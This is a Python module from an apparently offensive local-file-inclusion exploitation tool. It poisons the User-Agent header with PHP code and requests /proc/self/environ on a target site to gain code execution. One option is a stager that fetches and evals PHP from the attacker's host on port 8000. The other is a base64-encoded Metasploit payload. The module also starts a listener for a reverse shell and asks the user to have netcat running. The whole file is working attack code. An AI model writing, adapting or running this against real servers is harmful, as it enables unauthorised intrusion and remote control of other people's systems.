import subprocess
from os.path import abspath, dirname, join

from .utils import listener, attack, colors, cook, msf_payload

from .Detection import Detection

STAGER = "<?php eval(file_get_contents('http://{0}:8000/{1}.php'))?>"
HERE = abspath(dirname(__file__))


class Environ:
    def __init__(self, args):
        self.target = args.url
        self.nostager = args.nostager
        self.relative = args.relative
        self.location = "/proc/self/environ"
        self.cookies = args.cookies
        self.detection = args.detection

    def attack(self, payload):
        headers = {"User-Agent": payload}
        if self.cookies:
            f_cookies = cook(self.cookies)
            response = attack(
                self.target, self.location, headers=headers, cookies=f_cookies
            )
        else:
            response = attack(self.target, self.location, headers=headers)
        return response

    def execute_environ(self):
        if self.detection:
            detector = Detection(self)
            detector.detect()
            return

        lhost, lport, shell = msf_payload()
        file = join(HERE, "Server.py")

        handle = listener(lhost, lport)
        handle.handler()

        if self.nostager:
            with open("/tmp/{0}.php".format(shell), "r") as f:
                payload = "<?php eval(base64_decode('{0}')); ?>".format(
                    f.read().encode("base64").replace("\n", "")
                )
        else:
            payload = STAGER.format(lhost, shell)

            try:
                p = subprocess.Popen(
                    ["python3 {}".format(file)], shell=True, stdout=subprocess.PIPE
                )
                p.communicate()
            except OSError as e:
                print(colors("[!] Process Error", 91))
                print(e)

        headers = {"User-Agent": payload}

        input(
            colors(
                "[?] Press Enter To Continue When Your netcat listener is Running ...",
                94,
            )
        )

        headers = {"User-Agent": payload}
        if self.cookies:
            f_cookies = cook(self.cookies)
            attack(self.target, self.location, headers=headers, cookies=f_cookies)
        else:
            attack(self.target, self.location, headers=headers)
